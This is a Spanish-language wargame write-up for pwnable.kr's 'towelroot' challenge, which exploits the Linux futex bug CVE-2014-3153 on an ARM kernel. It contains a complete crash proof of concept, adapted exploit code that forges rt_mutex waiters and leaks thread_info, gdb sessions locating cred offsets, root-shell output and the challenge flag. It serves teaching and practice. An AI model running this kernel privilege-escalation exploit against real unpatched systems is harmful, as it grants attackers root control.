# towelroot

![img](https://raw.githubusercontent.com/Calana2/Wargame_Writeups/refs/heads/main/pwnable.kr/Hackers_Secret/towelroot.png)

### PoC
Este reto debe ser explotado usando CVE-2014-3153, AKA Towelroot. 

Lancé un PoC creado a partir de [este genial artículo](https://elongl.github.io/exploitation/2021/01/08/cve-2014-3153.html) que cubre el tema.

```c
#define _GNU_SOURCE
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <assert.h>
#include <unistd.h>
#include <sys/wait.h>

#define FUTEX_WAIT 0
#define FUTEX_LOCK_PI 6
#define FUTEX_UNLOCK_PI 7
#define FUTEX_WAIT_REQUEUE_PI 11
#define FUTEX_CMP_REQUEUE_PI 12


int futex(int *uaddr, int futex_op, int val, uint32_t val2, int *uaddr2, int val3)
{
    return syscall(SYS_futex, uaddr, futex_op, val, val2, uaddr2, val3);
}

int flock(int *uaddr)
{
    return futex(uaddr, FUTEX_LOCK_PI, 0, 0, NULL, 0);
}

int funlock(int *uaddr)
{
    return futex(uaddr, FUTEX_UNLOCK_PI, 0, 0, NULL, 0);
}

int fwait_requeue(int *src, int *dst, int expected_val)
{
    return futex(src, FUTEX_WAIT_REQUEUE_PI, expected_val, 0, dst, 0);
}

int frequeue(int *src, int *dst, int max_requeued_waiters, int expected_val)
{
    return futex(src, FUTEX_CMP_REQUEUE_PI, 1, max_requeued_waiters, dst, expected_val);
}

#define CRASH_SEC 3

int main()
{
    pid_t pid;
    uint32_t *futexes;
    uint32_t *non_pi_futex, *pi_futex;

    assert((futexes = mmap(NULL, sizeof(uint32_t) * 2, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0)) > 0);

    non_pi_futex = &futexes[0];
    pi_futex = &futexes[1];

    flock(pi_futex);

    assert((pid = fork()) != -1);
    if (!pid)
    {
        fwait_requeue(non_pi_futex, pi_futex, 0);
        puts("Child continues.");
        exit(EXIT_SUCCESS);
    }

    printf("Kernel will crash in %u seconds...\n", CRASH_SEC);
    sleep(CRASH_SEC);

    int ret = frequeue(non_pi_futex, pi_futex, 1, 0);
    *pi_futex = 0;
    ret = frequeue(pi_futex, pi_futex, 1, 0);
    wait(NULL);
}
```

```
/tmp $ ./a.out
Kernel will crash in 3 seconds...
Child continues.
------------[ cut here ]------------
kernel BUG at kernel/rtmutex_common.h:74!
Internal error: Oops - BUG: 0 [#1] SMP ARM
Modules linked in: m(O)
CPU: 0 PID: 545 Comm: a.out Tainted: G           O 3.11.4 #13
task: 86921680 ti: 8605a000 task.ti: 8605a000
PC is at rt_mutex_unlock+0xe8/0xec
LR is at rt_mutex_unlock+0x34/0xec
pc : [<8036563c>]    lr : [<80365588>]    psr: a0000093
sp : 8605bed8  ip : 00000000  fp : 804ec5e4
r10: 86921988  r9 : 00000000  r8 : 20000013
r7 : 8641a58c  r6 : 8605be7c  r5 : 8605a000  r4 : 8641a588
r3 : 00000000  r2 : 86921988  r1 : 0000000c  r0 : 20000013
Flags: NzCv  IRQs off  FIQs on  Mode SVC_32  ISA ARM  Segment user
Control: 10c53c7d  Table: 6355406a  DAC: 00000015
Process a.out (pid: 545, stack limit = 0x8605a238)
Stack: (0x8605bed8 to 0x8605c000)
bec0:                                                       8641a580 86921680
bee0: 8605bef4 00000308 869219d8 8005e3c8 804c60d0 00000000 86842198 00000005
bf00: 00000000 86921680 00000000 82ee2480 000000f8 8000e348 8605a000 00000000
bf20: 00000000 8001e0b8 00000000 8605a000 000000f8 82ee2480 8605a000 86921680
bf40: 00000000 80021d78 00000000 00000001 00000000 000a000a 00000000 00000000
bf60: 8605bf6c 86876fc0 00000000 8605a000 000000f8 8000e348 8605a000 00000000
bf80: 00000000 8002263c 00000000 000700de 76f92760 76f92760 000000f8 800226c8
bfa0: 00000000 8000e1a0 000700de 76f92760 00000000 000700ca 76fb2820 00000000
bfc0: 000700de 76f92760 76f92760 000000f8 00000000 00000000 76fb7000 00000000
bfe0: 000000f8 7ec19d04 76f23fc3 76ecd276 60000030 00000000 68bed066 46281ca3
[<8036563c>] (rt_mutex_unlock+0xe8/0xec) from [<8005e3c8>] (exit_pi_state_list+0x144/0x194)
[<8005e3c8>] (exit_pi_state_list+0x144/0x194) from [<8001e0b8>] (mm_release+0xf0/0x110)
[<8001e0b8>] (mm_release+0xf0/0x110) from [<80021d78>] (do_exit+0x11c/0x8d0)
[<80021d78>] (do_exit+0x11c/0x8d0) from [<8002263c>] (do_group_exit+0x48/0xc4)
[<8002263c>] (do_group_exit+0x48/0xc4) from [<800226c8>] (__wake_up_parent+0x0/0x18)
Code: e1c430b0 f57ff04f e320f004 e8bd81f0 (e7f001f2)
---[ end trace 0807ffc243172124 ]---
Fixing recursive fault but reboot is needed!
```

El resultado fue el esperado, el sistema sufrió un error irrecuperable.

#### Análisis de las protecciones

Si inspeccionamos `helper.c` vemos que no hay protecciones de escritura en la tabla de syscalls:

```c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/vmalloc.h>
#include <linux/mm.h>
#include <asm/unistd.h>
#include <asm/page.h>
#include <linux/syscalls.h>

#define SYS_CALL_TABLE          /* deleted from source */
#define NR_SYS_UNUSED           223

//Pointers to re-mapped writable pages
unsigned int** sct;
int g_len=0;
int g_stack=0;

// this system call is only added to make the task easier.
// no need to analyze/exploit this function. just use it as an helper for real-world exploit.
asmlinkage long sys_unknown(int n){
        char buf[4096];
        int i=0;
        for(i=0; i<4096; i++){
                buf[i] = n;
        }
        buf[4095]=0;
        g_len=strlen(buf);
        g_stack=&buf;
        while(1){
                schedule();
        }
        return 0;
}

static int __init initmodule(void ){
        sct = (unsigned int**)SYS_CALL_TABLE;
        sct[NR_SYS_UNUSED] = sys_unknown;       // it's vanilla kernel, no kernel hardning what so ever.
        printk("sys_unknown(syscall number : 223) is added(this is NOT for pwning)\n");
        return 0;
}

static void __exit exitmodule(void ){
        return;
}

module_init( initmodule );
module_exit( exitmodule );
MODULE_LICENSE("GPL");
```

#### Explotación

Usé [el repositorio del artículo que mencioné](https://github.com/elongl/CVE-2014-3153/blob/master/) como exploit base.

Tal como se nos indica, podemos apuntar a la entrada de esta syscall para ganar control del puntero a instrucción en caso de que consigamos una primitiva de escritura. 

Protecciones como ASLR o PXN no parecen estar activas (el helper dice "it's a vanilla kernel, no kernel hardening what so ever").

Hay que adaptar el exploit al contexto que tenemos. Primero. La estructura `rt_mutex_waiter` colgante se solapa con el grupo de mensajes iovec a partir del byte 0x32. De paso recontruimos la estructura completa y la enlazamos con el `fake_waiter`:

```c
void setup_msgs()
{
    struct rt_mutex_waiter *stack_fake_waiter = (struct rt_mutex_waiter *)((void *)&msg + 32);
    stack_fake_waiter->list_entry.prio = 0;
    stack_fake_waiter->list_entry.prio_list.next = stack_fake_waiter->list_entry.prio_list.prev = &fake_waiter.list_entry.prio_list;
    stack_fake_waiter->list_entry.node_list.next = stack_fake_waiter->list_entry.node_list.prev = &fake_waiter.list_entry.node_list;

    msgvec.msg_hdr.msg_iov = msg;
    msgvec.msg_hdr.msg_iovlen = COUNT_OF(msg);
}
```

Luego para filtrar `thread_info` necesitamos insertar un waiter tal y como dice. El objetivo es lograr que `leaked_waiter` acabe apuntando a un waiter real creado en la pila.

```c
void leak_thread_info()
{
    link_fake_leaker_waiters();
    //assert(!pthread_create(&corrupter, NULL, lock_pi_futex, NULL));
    assert(!pthread_create(&corrupter, NULL, lock_pi_futex_prio, NULL));
```

La ruta de ejecución que toma el kernel al crearse el waiter es esta:

```c
void plist_add(struct plist_node *node, struct plist_head *head)
{
	struct plist_node *first, *iter, *prev = NULL;
	struct list_head *node_next = &head->node_list;

	plist_check_head(head);
	WARN_ON(!plist_node_empty(node));
	WARN_ON(!list_empty(&node->prio_list));

	if (plist_head_empty(head))
		goto ins_node;

	first = iter = plist_first(head);

	do {
		if (node->prio < iter->prio) {
			node_next = &iter->node_list;
			break;
		}

		prev = iter;
		iter = list_entry(iter->prio_list.next,
				struct plist_node, prio_list);
	} while (iter != first);

	if (!prev || prev->prio != node->prio)
        // &new_waiter.prio_list, &fake_waiter.prio_list
		list_add_tail(&node->prio_list, &iter->prio_list);
ins_node:
	list_add_tail(&node->node_list, node_next);

	plist_check_head(head);
}

static inline void list_add_tail(struct list_head *new, struct list_head *head)
{
    // &new_waiter.prio_list,  fake_waiter->prio_list.prev, &fake_waiter->prio_list
    // &new_waiter.prio_list,  &leaked_waiter.prio_list, &fake_waiter.prio_list
	__list_add(new, head->prev, head);
}

static inline void __list_add(struct list_head *new,
			      struct list_head *prev,
			      struct list_head *next)
{
    next->prev = new;    // fake_waiter.prio_list.prev = &new_waiter.prio_list
    new->next = next;    // new_waiter.prio_list.next = &fake_waiter.prio_list
    new->prev = prev;    // new_waiter.prio_list.prev = &leaked_waiter.prio_list
    prev->next = new;    // leaked_waiter.prio_list.next = &new_waiter.prio_list
}
```

IMAGENES

Posteriormente hay que corregir la estructura `thread_info` que cambia para builds de ARM:

```c
// https://elixir.bootlin.com/linux/v3.11.4/source/arch/arm/include/asm/thread_info.h#L50
struct thread_info
{
	unsigned long		flags;		/* low level flags */
	int			preempt_count;	  /* 0 => preemptable, <0 => bug */
	unsigned long		addr_limit;	/* address limit */
	struct task_struct	*task;		/* main task structure */
};
```

También el layout de `task_struct` cambia. Necesitamos encontar el offet a `*group_leader` y `*cred`.

Para encontrar `*cred` buscamos por `comm`, un campo que contiene el nombre del archivo ejecutado. `cred` está justo antes:

```c
https://elixir.bootlin.com/linux/v3.11.4/source/include/linux/sched.h#L1183
	const struct cred __rcu *cred;	/* effective (overridable) subjective task
					 * credentials (COW) */
	char comm[TASK_COMM_LEN]; /* executable name excluding path
				     - access with [gs]et_task_comm (which lock
				       it with task_lock())
				     - initialized normally by setup_new_exec */
```

```
[*] Escalating main thread's privileges to root.
[*] Written 0xffffffff to addr_limit.
Corrupter's task_struct @ 0x868552c0
Popping root shell.
/bin/sh: can't access tty; job control turned off
```

```
gdb) find 0x868552c0, 0x868552c0 + 0x400, "a.out"
0x868554b8
1 pattern found.
(gdb) p/dx 0x868554b8 - 0x868552c0
$3 = 0x1f8
(gdb) x/wx 0x868554b0
0x868554b0:	0x837f6680   # <--- real cred
(gdb) x/10wx 0x837f6680
0x837f6680:	0x00000014	0x000003e8	0x000003e8	0x000003e8
0x837f6690:	0x000003e8	0x000003e8	0x000003e8	0x000003e8
0x837f66a0:	0x000003e8	0x00000000
(gdb) p/d 0x3e8
$4 = 1000
(gdb) x/wx 0x868554b4    # <-- cred  
0x868554b4:	0x837f6680
# el offset a *cred es 0x1f4
```

Ahora `group_leader` sería un puntero al task struct del proceso que ejecuta `main` pero por alguna razón en la adaptación que estaba haciendo, el leak obtenido fue del `thread info` de main. Se confirma dado que `group_leader` apunta a sí mismo:
```
(gdb)
0x8687cc60:	0x00000134	0x868343c0	0x868343c0	0x8687cc6c
0x8687cc70:	0x8687cc6c	0x86855b74	0x868f5034	0x8687cb40
(gdb)
0x8687cc80:	0x8687cc80	# <-- group_leader 0x8687cc80	0x8687cc88	0x8687cc88
0x8687cc90:	0x00000000	0x83560cc8	0x83560cc0	0x868f505c
(gdb) p/dx 0x8687cc80 - 0x8687cb40
$8 = 0x140
```

```c
 struct task_struct
{
     // calculated while debugging
     char pad1[0x140];
     struct task_struct *group_leader;
     char pad[0x1f4 - 0x140 - sizeof(void*)];
     struct cred *cred;
};
```

`I_c4n_d0_bett3r_th4n_geohot`
